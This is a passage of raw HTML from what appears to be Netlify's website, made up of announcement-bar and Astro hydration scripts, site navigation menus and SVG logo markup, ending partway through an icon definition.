                    <svg width="0.75em" height="1em" aria-hidden="true" style="--button-icon-size: 1.25rem" data-astro-cid-o54ltyzl="true" data-icon="close">
                        <symbol id="ai:local:close" viewBox="0 0 384 512">
                            <path fill="currentcolor" d="M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3l105.4 105.3c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256z"></path>
                        </symbol>
                        <use href="#ai:local:close"></use>
                    </svg>
                </button>
            </div>
            <script type="module">
                (function() {
                    const e = document.querySelector(".announcement-bar")
                      , n = document.querySelector(".announcement-bar > .close");
                    if (!e || !n)
                        return;
                    const r = e.getAttribute("data-href");
                    new ResizeObserver( ([t]) => {
                        document.body.style.setProperty("--announcement-bar-height", `${t.borderBoxSize[0].blockSize}px`)
                    }
                    ).observe(e),
                    n.addEventListener("click", t => {
                        t.preventDefault(),
                        r && localStorage.setItem("Netlify_hide-announcement-bar", r),
                        e.setAttribute("hidden", "true")
                    }
                    )
                }
                )();
            </script>
            <section class="wrapper l-breakout">
                <style>
                    astro-island,astro-slot,astro-static-slot {
                        display: contents
                    }
                </style>
                <script>
                    ( () => {
                        var e = async t => {
                            await (await t())()
                        }
                        ;
                        (self.Astro || (self.Astro = {})).only = e;
                        window.dispatchEvent(new Event("astro:only"));
                    }
                    )();
                </script>
                <script>
                    ( () => {
                        var A = Object.defineProperty;
                        var g = (i, o, a) => o in i ? A(i, o, {
                            enumerable: !0,
                            configurable: !0,
                            writable: !0,
                            value: a
                        }) : i[o] = a;
                        var d = (i, o, a) => g(i, typeof o != "symbol" ? o + "" : o, a);
                        {
                            let i = {
                                0: t => m(t),
                                1: t => a(t),
                                2: t => new RegExp(t),
                                3: t => new Date(t),
                                4: t => new Map(a(t)),
                                5: t => new Set(a(t)),
                                6: t => BigInt(t),
                                7: t => new URL(t),
                                8: t => new Uint8Array(t),
                                9: t => new Uint16Array(t),
                                10: t => new Uint32Array(t),
                                11: t => 1 / 0 * t
                            }
                              , o = t => {
                                let[l,e] = t;
                                return l in i ? i[l](e) : void 0
                            }
                              , a = t => t.map(o)
                              , m = t => typeof t != "object" || t === null ? t : Object.fromEntries(Object.entries(t).map( ([l,e]) => [l, o(e)]));
                            class y extends HTMLElement {
                                constructor() {
                                    super(...arguments);
                                    d(this, "Component");
                                    d(this, "hydrator");
                                    d(this, "hydrate", async () => {
                                        var b;
                                        if (!this.hydrator || !this.isConnected)
                                            return;
                                        let e = (b = this.parentElement) == null ? void 0 : b.closest("astro-island[ssr]");
                                        if (e) {
                                            e.addEventListener("astro:hydrate", this.hydrate, {
                                                once: !0
                                            });
                                            return
                                        }
                                        let c = this.querySelectorAll("astro-slot")
                                          , n = {}
                                          , h = this.querySelectorAll("template[data-astro-template]");
                                        for (let r of h) {
                                            let s = r.closest(this.tagName);
                                            s != null && s.isSameNode(this) && (n[r.getAttribute("data-astro-template") || "default"] = r.innerHTML,
                                            r.remove())
                                        }
                                        for (let r of c) {
                                            let s = r.closest(this.tagName);
                                            s != null && s.isSameNode(this) && (n[r.getAttribute("name") || "default"] = r.innerHTML)
                                        }
                                        let p;
                                        try {
                                            p = this.hasAttribute("props") ? m(JSON.parse(this.getAttribute("props"))) : {}
                                        } catch (r) {
                                            let s = this.getAttribute("component-url") || "<unknown>"
                                              , v = this.getAttribute("component-export");
                                            throw v && (s += ` (export ${v})`),
                                            console.error(`[hydrate] Error parsing props for component ${s}`, this.getAttribute("props"), r),
                                            r
                                        }
                                        let u;
                                        await this.hydrator(this)(this.Component, p, n, {
                                            client: this.getAttribute("client")
                                        }),
                                        this.removeAttribute("ssr"),
                                        this.dispatchEvent(new CustomEvent("astro:hydrate"))
                                    }
                                    );
                                    d(this, "unmount", () => {
                                        this.isConnected || this.dispatchEvent(new CustomEvent("astro:unmount"))
                                    }
                                    )
                                }
                                disconnectedCallback() {
                                    document.removeEventListener("astro:after-swap", this.unmount),
                                    document.addEventListener("astro:after-swap", this.unmount, {
                                        once: !0
                                    })
                                }
                                connectedCallback() {
                                    if (!this.hasAttribute("await-children") || document.readyState === "interactive" || document.readyState === "complete")
                                        this.childrenConnectedCallback();
                                    else {
                                        let e = () => {
                                            document.removeEventListener("DOMContentLoaded", e),
                                            c.disconnect(),
                                            this.childrenConnectedCallback()
                                        }
                                          , c = new MutationObserver( () => {
                                            var n;
                                            ((n = this.lastChild) == null ? void 0 : n.nodeType) === Node.COMMENT_NODE && this.lastChild.nodeValue === "astro:end" && (this.lastChild.remove(),
                                            e())
                                        }
                                        );
                                        c.observe(this, {
                                            childList: !0
                                        }),
                                        document.addEventListener("DOMContentLoaded", e)
                                    }
                                }
                                async childrenConnectedCallback() {
                                    let e = this.getAttribute("before-hydration-url");
                                    e && await import(e),
                                    this.start()
                                }
                                async start() {
                                    let e = JSON.parse(this.getAttribute("opts"))
                                      , c = this.getAttribute("client");
                                    if (Astro[c] === void 0) {
                                        window.addEventListener(`astro:${c}`, () => this.start(), {
                                            once: !0
                                        });
                                        return
                                    }
                                    try {
                                        await Astro[c](async () => {
                                            let n = this.getAttribute("renderer-url")
                                              , [h,{default: p}] = await Promise.all([import(this.getAttribute("component-url")), n ? import(n) : () => () => {}
                                            ])
                                              , u = this.getAttribute("component-export") || "default";
                                            if (!u.includes("."))
                                                this.Component = h[u];
                                            else {
                                                this.Component = h;
                                                for (let f of u.split("."))
                                                    this.Component = this.Component[f]
                                            }
                                            return this.hydrator = p,
                                            this.hydrate
                                        }
                                        , e, this)
                                    } catch (n) {
                                        console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`, n)
                                    }
                                }
                                attributeChangedCallback() {
                                    this.hydrate()
                                }
                            }
                            d(y, "observedAttributes", ["props"]),
                            customElements.get("astro-island") || customElements.define("astro-island", y)
                        }
                    }
                    )();
                </script>
                <nav id="site-nav" class="site-navigation" aria-labelledby="site-nav-label" data-astro-cid-2ioqeek6="">
                    <h2 id="site-nav-label" class="visually-hidden" data-astro-cid-2ioqeek6="">Site navigation</h2>
                    <a id="mainNav-netlifyLogo" href="/" data-astro-cid-jwiz4kkf="">
                        <span class="visually-hidden" data-astro-cid-jwiz4kkf="">Go to homepage</span>
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 209" fill="none" aria-hidden="true" data-astro-cid-jwiz4kkf="">
                            <g clip-path="url(#clip0_235_8)" data-astro-cid-jwiz4kkf="">
                                <path d="M117.436 207.036V154.604L118.529 153.51H129.452L130.545 154.604V207.036L129.452 208.13H118.529L117.436 207.036Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M117.436 53.5225V1.09339L118.529 0H129.452L130.545 1.09339V53.5225L129.452 54.6159H118.529L117.436 53.5225Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M69.9539 169.238H68.4094L60.6869 161.512V159.967L78.7201 141.938L86.8976 141.942L87.9948 143.031V151.209L69.9539 169.238Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M69.9462 38.8917H68.4017L60.6792 46.6181V48.1626L78.7124 66.192L86.8899 66.1882L87.9871 65.0986V56.9212L69.9462 38.8917Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M1.09339 97.5104H75.3711L76.4645 98.6038V109.526L75.3711 110.62H1.09339L0 109.526V98.6038L1.09339 97.5104Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M440.999 97.5104H510.91L512.004 98.6038V109.526L510.91 110.62H436.633L435.539 109.526L439.905 98.6038L440.999 97.5104Z" class="spark" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M212.056 108.727L210.963 109.821H177.079L175.986 110.914C175.986 113.101 178.173 119.657 186.916 119.657C190.196 119.657 193.472 118.564 194.566 116.377L195.659 115.284H208.776L209.869 116.377C208.776 122.934 203.313 132.774 186.916 132.774C168.336 132.774 159.589 119.657 159.589 104.357C159.589 89.0576 168.332 75.9408 185.822 75.9408C203.313 75.9408 212.056 89.0576 212.056 104.357V108.731V108.727ZM195.659 97.7971C195.659 96.7037 194.566 89.0538 185.822 89.0538C177.079 89.0538 175.986 96.7037 175.986 97.7971L177.079 98.8905H194.566L195.659 97.7971Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M242.66 115.284C242.66 117.47 243.753 118.564 245.94 118.564H255.776L256.87 119.657V130.587L255.776 131.681H245.94C236.103 131.681 227.36 127.307 227.36 115.284V91.2368L226.266 90.1434H218.617L217.523 89.05V78.1199L218.617 77.0265H226.266L227.36 75.9332V66.0965L228.453 65.0031H241.57L242.663 66.0965V75.9332L243.757 77.0265H255.78L256.874 78.1199V89.05L255.78 90.1434H243.757L242.663 91.2368V115.284H242.66Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M283.1 131.681H269.983L268.889 130.587V56.2636L269.983 55.1702H283.1L284.193 56.2636V130.587L283.1 131.681Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M312.61 68.2871H299.493L298.399 67.1937V56.2636L299.493 55.1702H312.61L313.703 56.2636V67.1937L312.61 68.2871ZM312.61 131.681H299.493L298.399 130.587V78.1237L299.493 77.0304H312.61L313.703 78.1237V130.587L312.61 131.681Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M363.98 56.2636V67.1937L362.886 68.2871H353.05C350.863 68.2871 349.769 69.3805 349.769 71.5672V75.9408L350.863 77.0342H361.793L362.886 78.1276V89.0576L361.793 90.151H350.863L349.769 91.2444V130.591L348.676 131.684H335.559L334.466 130.591V91.2444L333.372 90.151H325.723L324.629 89.0576V78.1276L325.723 77.0342H333.372L334.466 75.9408V71.5672C334.466 59.5438 343.209 55.1702 353.046 55.1702H362.882L363.976 56.2636H363.98Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M404.42 132.774C400.046 143.704 395.677 150.261 380.373 150.261H374.906L373.813 149.167V138.237L374.906 137.144H380.373C385.836 137.144 386.929 136.05 388.023 132.77V131.677L370.536 89.05V78.1199L371.63 77.0265H381.466L382.56 78.1199L395.677 115.284H396.77L409.887 78.1199L410.98 77.0265H420.817L421.91 78.1199V89.05L404.424 132.77L404.42 132.774Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                                <path d="M135.454 131.681L134.361 130.587L134.368 98.9172C134.368 93.4541 132.22 89.2182 125.625 89.0806C122.234 88.9926 118.354 89.0729 114.209 89.2488L113.59 89.8834L113.598 130.587L112.504 131.681H99.3913L98.2979 130.587V77.5388L99.3913 76.4454L128.901 76.1778C143.685 76.1778 149.668 86.3356 149.668 97.8009V130.587L148.575 131.681H135.454Z" class="text" data-astro-cid-jwiz4kkf=""></path>
                            </g>
                            <defs data-astro-cid-jwiz4kkf="">
                                <clipPath id="clip0_235_8" data-astro-cid-jwiz4kkf="">
                                    <rect width="512" height="208.126" fill="white" data-astro-cid-jwiz4kkf=""></rect>
                                </clipPath>
                            </defs>
                        </svg>
                    </a>
                    <a class="skip-to-content" href="#main" data-astro-cid-2ioqeek6="">Skip to content</a>
                    <ul data-variant="compact" class="menu" role="list" data-astro-cid-2ioqeek6="">
                        <li data-astro-cid-2ioqeek6="">
                            <button id="main-nav-compact-search" class="site-search-toggle" data-ntl-search-toggle="" data-astro-cid-3dk7mn5f="">
                                <span class="visually-hidden" data-astro-cid-3dk7mn5f="">Search</span>
                                <svg width="16" height="20" aria-hidden="true" data-astro-cid-3dk7mn5f="true" data-icon="search">
                                    <symbol id="ai:local:search" viewBox="0 0 22 24">
                                        <path fill="currentcolor" d="M9.413.473a9.081 9.081 0 0 1 6.454 15.47l5.526 5.524-2.122 2.121-5.872-5.872A9.081 9.081 0 1 1 9.413.472m0 3a6.081 6.081 0 1 0 0 12.162 6.081 6.081 0 0 0 0-12.162"></path>
                                    </symbol>
                                    <use href="#ai:local:search"></use>
                                </svg>
                            </button>
                        </li>
                        <li data-astro-cid-2ioqeek6="">
                            <a id="main-nav-compact-login" href="https://app.netlify.com/login?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-2ioqeek6="">Log in </a>
                        </li>
                    </ul>
                    <button id="main-nav-compact-hamburger" type="button" class="nav-toggle" aria-expanded="false" aria-controls="main-menu" data-site-nav-toggle="" data-astro-cid-qsvltxvz="">
                        <span class="visually-hidden" data-astro-cid-qsvltxvz="">Toggle main menu</span>
                        <svg width="1.24em" height="1em" aria-hidden="true" data-astro-cid-qsvltxvz="true" data-icon="menu">
                            <symbol id="ai:local:menu" viewBox="0 0 31 25">
                                <path fill="currentcolor" d="M.581.719h30v4h-30zm0 10h30v4h-30zm0 10h30v4h-30z"></path>
                            </symbol>
                            <use href="#ai:local:menu"></use>
                        </svg>
                    </button>
                    <ul class="menu" role="list" data-astro-cid-2ioqeek6="">
                        <li class="has-submenu" data-astro-cid-2ioqeek6="">
                            <span id="main-nav-platform" data-astro-cid-2ioqeek6="">Platform</span>
                            <submenu-utils data-astro-cid-sdvpe5d5="true">
                                <button class="submenu-toggle" aria-haspopup="true" aria-expanded="false" data-astro-cid-sdvpe5d5="">
                                    <span class="visually-hidden" data-astro-cid-sdvpe5d5="">Toggle platform submenu</span>
                                    <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="chevron">
                                        <symbol id="ai:local:chevron" viewBox="0 0 512 512">
                                            <path fill="currentcolor" d="M233.4 406.6c12.5 12.5 32.8 12.5 45.3 0l192-192c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L256 338.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l192 192z"></path>
                                        </symbol>
                                        <use href="#ai:local:chevron"></use>
                                    </svg>
                                </button>
                                <div id="platform-submenu" class="submenu" data-astro-cid-sdvpe5d5="">
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">The Netlify Platform</h3>
                                        <p>
                                            <strong>Instantly build and deploy</strong>
                                            your apps to our global network from Git. Custom domains, https, deploy previews, rollbacks and much more.
                                        </p>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-explore-the-platform" href="/platform/" data-astro-cid-sdvpe5d5="">Explore the platform </a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">Key Features</h3>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-deploy-previews" href="/platform/core/deploy-previews/" data-astro-cid-sdvpe5d5="">Deploy Previews </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-functions" href="/platform/core/functions/" data-astro-cid-sdvpe5d5="">Functions </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-storage" href="/platform/storage/" data-astro-cid-sdvpe5d5="">Storage </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-primitives" href="/platform/primitives/" data-astro-cid-sdvpe5d5="">Primitives </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-connect" href="/platform/connect/" data-astro-cid-sdvpe5d5="">Connect </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-visual-editor" href="/platform/create/" data-astro-cid-sdvpe5d5="">Visual Editor </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-security" href="/security/" data-astro-cid-sdvpe5d5="">Security </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-edge-network" href="/platform/core/edge/" data-astro-cid-sdvpe5d5="">Edge network </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </submenu-utils>
                            <script type="module" src="/_astro/SiteNavigationSubmenu.astro_astro_type_script_index_0_lang.BtUBgyPb.js"></script>
                        </li>
                        <li class="has-submenu" data-astro-cid-2ioqeek6="">
                            <span id="main-nav-solutions" data-astro-cid-2ioqeek6="">Solutions</span>
                            <submenu-utils data-astro-cid-sdvpe5d5="true">
                                <button class="submenu-toggle" aria-haspopup="true" aria-expanded="false" data-astro-cid-sdvpe5d5="">
                                    <span class="visually-hidden" data-astro-cid-sdvpe5d5="">Toggle solutions submenu</span>
                                    <svg width="1em" height="1em" viewBox="0 0 512 512" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="chevron">
                                        <use href="#ai:local:chevron"></use>
                                    </svg>
                                </button>
                                <div id="solutions-submenu" class="submenu" data-astro-cid-sdvpe5d5="">
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">Why Netlify?</h3>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-customers" href="/customers/" data-astro-cid-sdvpe5d5="">Customers </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-agent-experience" href="/agent-experience/" data-astro-cid-sdvpe5d5="">Agent Experience </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-roi-calculator" href="/roi-calculator/" data-astro-cid-sdvpe5d5="">ROI Calculator </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-whitepaper" href="/whitepaper/" data-astro-cid-sdvpe5d5="">Whitepaper </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-partner-directory" href="/agency-directory/" data-astro-cid-sdvpe5d5="">Partner directory </a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">Use Cases</h3>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-code-agents" href="/solutions/code-agents/" data-astro-cid-sdvpe5d5="">Code Agents </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-company-websites" href="/for/company-websites/" data-astro-cid-sdvpe5d5="">Company Websites </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-e-commerce" href="/for/ecommerce/" data-astro-cid-sdvpe5d5="">E-commerce </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-web-apps" href="/for/web-applications/" data-astro-cid-sdvpe5d5="">Web Apps </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-large-sites" href="/blog/2020/06/16/building-large-sites-on-netlify/" data-astro-cid-sdvpe5d5="">Large Sites </a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <p>
                                            <strong>Don’t see your solution? </strong>
                                            We can help. <a href="https://www.netlify.com/enterprise/contact/?attr=homepage&amp;ref=&amp;id=nav-solutions-chat-with-netlify-expert&amp;__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795">Chat with a Netlify expert</a>
                                        </p>
                                    </div>
                                </div>
                            </submenu-utils>
                        </li>
                        <li class="has-submenu" data-astro-cid-2ioqeek6="">
                            <span id="main-nav-developers" data-astro-cid-2ioqeek6="">Developers</span>
                            <submenu-utils data-astro-cid-sdvpe5d5="true">
                                <button class="submenu-toggle" aria-haspopup="true" aria-expanded="false" data-astro-cid-sdvpe5d5="">
                                    <span class="visually-hidden" data-astro-cid-sdvpe5d5="">Toggle developers submenu</span>
                                    <svg width="1em" height="1em" viewBox="0 0 512 512" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="chevron">
                                        <use href="#ai:local:chevron"></use>
                                    </svg>
                                </button>
                                <div id="developers-submenu" class="submenu" data-astro-cid-sdvpe5d5="">
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">Where to start</h3>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-docs" href="https://docs.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-sdvpe5d5="">Docs </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-developer-guides" href="https://developers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-sdvpe5d5="">Developer guides </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-templates" href="/integrations/templates/" data-astro-cid-sdvpe5d5="">Templates </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-integrations" href="/integrations/" data-astro-cid-sdvpe5d5="">Integrations </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <a id="nav-build-with-ai" href="https://docs.netlify.com/welcome/build-with-ai/overview/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-sdvpe5d5="">Build with AI </a>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="section l-stack" data-astro-cid-sdvpe5d5="">
                                        <h3 data-astro-cid-sdvpe5d5="">Project kickstarts</h3>
                                        <ul class="l-stack" role="list" data-astro-cid-sdvpe5d5="">
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="0.8em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="astro">
                                                    <symbol id="ai:local:astro" viewBox="0 0 85 107">
                                                        <path fill="currentColor" d="M27.59 91.137c-4.834-4.42-6.246-13.704-4.232-20.43 3.492 4.241 8.33 5.584 13.342 6.343 7.737 1.17 15.336.732 22.523-2.804.822-.405 1.582-.943 2.48-1.489.675 1.957.85 3.932.615 5.943-.573 4.896-3.01 8.678-6.885 11.545-1.55 1.147-3.19 2.172-4.79 3.253-4.917 3.323-6.247 7.22-4.4 12.888.044.139.084.277.183.614-2.51-1.124-4.344-2.76-5.742-4.911-1.475-2.27-2.177-4.78-2.214-7.498-.019-1.322-.019-2.656-.197-3.96-.434-3.178-1.926-4.601-4.737-4.683-2.884-.084-5.166 1.699-5.771 4.507-.046.216-.113.429-.18.68zM0 69.587s14.314-6.973 28.668-6.973L39.49 29.12c.405-1.62 1.588-2.72 2.924-2.72s2.518 1.1 2.924 2.72L56.16 62.614c17 0 28.668 6.973 28.668 6.973S60.514 3.352 60.467 3.219C59.769 1.261 58.591 0 57.003 0H27.827c-1.588 0-2.718 1.261-3.464 3.22C24.311 3.35 0 69.586 0 69.586"></path>
                                                    </symbol>
                                                    <use href="#ai:local:astro"></use>
                                                </svg>
                                                <a id="nav-astro" href="https://docs.netlify.com/frameworks/astro/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-astro-cid-sdvpe5d5="">Astro </a>
                                            </li>
                                            <li data-astro-cid-sdvpe5d5="">
                                                <svg width="1em" height="1em" aria-hidden="true" data-astro-cid-sdvpe5d5="true" data-icon="tanstack">
                                                    <symbol id="ai:local:tanstack" viewBox="0 0 30 30">
                                                        <g fill="none">
                                                            <defs>
                                                                <path id="b" fill="#fff" d="M15 30c8.284 0 15-6.716 15-15S23.284 0 15 0 0 6.716 0 15s6.716 15 15 15"></path>
                                                            </defs>
                                                            <g clip-path="url(#a)">
                                                                <mask id="c" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#c)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M9.74 20.847a11.9 11.9 0 0 0-5.498-1.32c-5.942 0-10.759 4.212-10.759 9.407"></path>
                                                                </g>
                                                                <mask id="d" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#d)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M8.185 21.98a12.1 12.1 0 0 0-3.943-.652c-5.942 0-10.759 4.212-10.759 9.407"></path>
                                                                </g>
                                                                <mask id="e" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#e)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M6.93 23.33c-.86-.193-1.76-.295-2.688-.295-5.942 0-10.759 4.21-10.759 9.406"></path>
                                                                </g>
                                                                <mask id="f" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#f)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M36.517 28.934c0-5.195-4.817-9.406-10.759-9.406-1.979 0-3.833.467-5.426 1.282"></path>
                                                                </g>
                                                                <mask id="g" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#g)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M36.517 30.735c0-5.195-4.817-9.407-10.759-9.407-1.412 0-2.76.238-3.996.67"></path>
                                                                </g>
                                                                <mask id="h" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#h)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M36.517 32.44c0-5.194-4.817-9.405-10.759-9.405-.886 0-1.747.093-2.57.27"></path>
                                                                </g>
                                                                <mask id="i" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#i)">
                                                                    <path stroke="currentColor" stroke-width="1.185" d="M15 48.318c6.635 0 12.014-6.451 12.014-14.408S21.635 19.502 15 19.502 2.986 25.952 2.986 33.91 8.365 48.318 15 48.318Z"></path>
                                                                </g>
                                                                <mask id="j" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#j)">
                                                                    <path stroke="currentColor" stroke-width="1.09" d="M26.8 9.076a4.834 4.834 0 1 0 0-9.669 4.834 4.834 0 0 0 0 9.669Z"></path>
                                                                </g>
                                                                <mask id="k" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#k)">
                                                                    <path fill="currentColor" d="M20.284 4.17a.284.284 0 1 1 0 .57h-1.421a.284.284 0 0 1 0-.57z"></path>
                                                                </g>
                                                                <mask id="l" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#l)">
                                                                    <path fill="currentColor" d="M18.774 2.738a.284.284 0 0 1 .336-.22l1.256.26a.284.284 0 0 1-.116.557l-1.256-.26a.284.284 0 0 1-.22-.337"></path>
                                                                </g>
                                                                <mask id="m" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#m)">
                                                                    <path fill="currentColor" d="M20.35 5.697a.284.284 0 1 1 .152.549l-1.374.379a.284.284 0 1 1-.151-.548l1.374-.38Z"></path>
                                                                </g>
                                                                <mask id="n" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#n)">
                                                                    <path fill="currentColor" d="M20.955 7.238a.284.284 0 0 1 .27.5l-1.137.616a.284.284 0 1 1-.27-.5z"></path>
                                                                </g>
                                                                <mask id="o" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#o)">
                                                                    <path fill="currentColor" d="M21.842 8.467a.284.284 0 0 1 .392.412l-.948.9a.284.284 0 1 1-.392-.412z"></path>
                                                                </g>
                                                                <mask id="p" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#p)">
                                                                    <path fill="currentColor" d="M23.092 9.52a.284.284 0 1 1 .486.295l-.655 1.083a.284.284 0 1 1-.487-.294z"></path>
                                                                </g>
                                                                <mask id="q" width="30" height="30" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type:luminance">
                                                                    <use href="#b"></use>
                                                                </mask>
                                                                <g mask="url(#q)">
